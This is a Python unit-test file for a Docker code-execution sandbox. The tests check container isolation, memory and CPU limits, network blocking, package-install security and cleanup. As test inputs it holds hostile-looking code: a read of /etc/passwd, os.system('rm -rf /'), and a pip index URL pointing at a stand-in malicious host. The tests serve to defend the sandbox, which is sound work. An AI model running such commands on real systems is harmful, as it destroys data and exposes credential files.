import unittest
import os
import subprocess
import time
from code_executor import CodeExecutor

class TestCodeExecutorSecurity(unittest.TestCase):
    def setUp(self):
        self.executor = CodeExecutor()
        
    def tearDown(self):
        self.executor.cleanup()
        
    def test_container_isolation(self):
        """Test that containers cannot access host system"""
        malicious_code = """
import os
try:
    with open('/etc/passwd', 'r') as f:
        print(f.read())
except Exception as e:
    print(f"Access denied: {str(e)}")
"""
        result = self.executor.execute_code(malicious_code, [], timeout=5)
        self.assertFalse(result['success'])
        self.assertIn("Access denied", result['error'] or result['output'] or "")
        
    def test_resource_limits(self):
        """Test that resource limits are properly enforced"""
        # Test memory limit
        memory_test = """
import numpy as np
# Try to allocate more than 512MB
arr = np.zeros((10000, 10000), dtype=np.float64)
"""
        result = self.executor.execute_code(memory_test, ["numpy"], timeout=5)
        self.assertFalse(result['success'])
        self.assertIn("Memory", result['error'] or "")
        
        # Test CPU limit
        cpu_test = """
while True:
    pass
"""
        result = self.executor.execute_code(cpu_test, [], timeout=2)
        self.assertFalse(result['success'])
        self.assertIn("timed out", result['error'] or "")
        
    def test_network_isolation(self):
        """Test that containers cannot access network"""
        network_test = """
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('google.com', 80))
    print("Network access successful")
except Exception as e:
    print(f"Network access denied: {str(e)}")
"""
        result = self.executor.execute_code(network_test, [], timeout=5)
        self.assertTrue(result['success'])
        self.assertIn("Network access denied", result['output'])
        
    def test_file_system_isolation(self):
        """Test that containers cannot access sensitive files"""
        fs_test = """
import os
try:
    os.listdir('/')
    print("Root access successful")
except Exception as e:
    print(f"Access denied: {str(e)}")
"""
        result = self.executor.execute_code(fs_test, [], timeout=5)
        self.assertTrue(result['success'])
        self.assertIn("Access denied", result['output'])
        
    def test_package_security(self):
        """Test that malicious package installation attempts are blocked"""
        malicious_package = ["--index-url=http://malicious-site.com/simple", "requests"]
        result = self.executor.execute_code("print('test')", malicious_package, timeout=5)
        self.assertFalse(result['success'])
        
    def test_code_injection_prevention(self):
        """Test that code injection attempts are prevented"""
        injection_test = """
import os
os.system('rm -rf /')  # Attempt to delete everything
"""
        result = self.executor.execute_code(injection_test, [], timeout=5)
        self.assertFalse(result['success'])
        self.assertIn("Permission denied", result['error'] or result['output'] or "")
        
    def test_container_cleanup(self):
        """Test that containers are properly cleaned up"""
        # Create multiple containers
        for _ in range(3):
            self.executor.execute_code("print('test')", [], timeout=1)
            
        # Get container count before cleanup
        before_cleanup = subprocess.run(
            ["docker", "ps", "-q"],
            capture_output=True,
            text=True
        ).stdout.count('\n')
        
        self.executor.cleanup()
        
        # Get container count after cleanup
        after_cleanup = subprocess.run(
            ["docker", "ps", "-q"],
            capture_output=True,
            text=True
        ).stdout.count('\n')
        
        self.assertEqual(after_cleanup, 0)
        self.assertGreater(before_cleanup, 0)

if __name__ == '__main__':
    unittest.main() 